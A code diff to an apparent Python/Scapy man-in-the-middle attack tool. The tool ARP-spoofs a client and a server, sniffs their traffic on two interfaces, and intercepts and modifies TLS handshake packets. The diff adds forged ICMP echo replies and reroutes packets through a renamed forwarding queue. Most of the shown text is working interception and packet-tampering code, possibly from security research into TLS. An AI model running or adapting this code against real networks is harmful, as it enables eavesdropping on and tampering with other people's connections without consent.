@@ -13,7 +13,7 @@ def arpspoof(interface, target, gateway):
     Process(target = ARPSpoof(interface, target, gateway).run, daemon=True).start()
 
 def get_mac(ip, interface):
-    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 5, iface = interface, inter = 0.1)
     for snd, rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
 
@@ -27,7 +27,7 @@ class MITM:
         self.server_port = server_port
         self.task = Task(PktHandler())
         self.tls_queue = mp.Queue()
-        self.tcp_queue = mp.Queue()
+        self.ip_queue = mp.Queue()
         self.client_mac = get_mac(self.client_ip, "eth0")
         self.server_mac = get_mac(self.server_ip, "eth1")
         self.eth0_mac = get_if_hwaddr("eth0")
@@ -58,6 +58,13 @@ class MITM:
         # sniff on eth1 for intercepting server packets.
         s_bpf = f"tcp and (src port {sport} and src net {sip})"
         p = Process(target = do_sniff, daemon=True, args = (self.sender, s_bpf, "eth1",))
+
+        bpf = f"icmp and (dst port {sport} and dst net {sip})"
+        Process(target = do_sniff, daemon=True, args = (self.icmp_sender, bpf, "eth0")).start()
+
+        bpf = f"icmp and (src port {sport} and src net {sip})"
+        Process(target = do_sniff, daemon=True, args = (self.icmp_sender, bpf, "eth1")).start()
+
         print("mitm started")
         p.start()
         p.join()
@@ -69,11 +76,18 @@ class MITM:
             self.tls_queue.put(pkt)
         else:
             # TCP packet, forward directly.
-            self.tcp_queue.put(pkt)
+            self.ip_queue.put(pkt)
+
+    def icmp_sender(self, pkt):
+        ip = pkt.payload.payload 
+        ip.src, ip.dst = ip.dst, ip.src
+        ip.payload.type = "echo-reply" 
+
+        self.forward(Ether()/ip)
 
     def tcp_worker(self):
         while True:
-            pkt = self.tcp_queue.get()
+            pkt = self.ip_queue.get()
             self.forward(pkt)
 
     def tls_worker(self):
@@ -130,15 +144,15 @@ class MITM:
             del ack.payload.payload
 
             ack = ack / TCP(self.task.handler.MODIFIED_TCP)
-            self.tcp_queue.put(ack)
+            self.ip_queue.put(ack)
             ack.show()
             self.task.increase()
         elif state == TASKSTATE.PASS.value:
             # already visited, retransmit; if no, the extended key derive will failed.
-            self.tcp_queue.put(pkt)
+            self.ip_queue.put(pkt)
             return
 
-        self.tcp_queue.put(pkt)
+        self.ip_queue.put(pkt)
 
 if __name__ == "__main__":
     # client ip, server ip, server port.
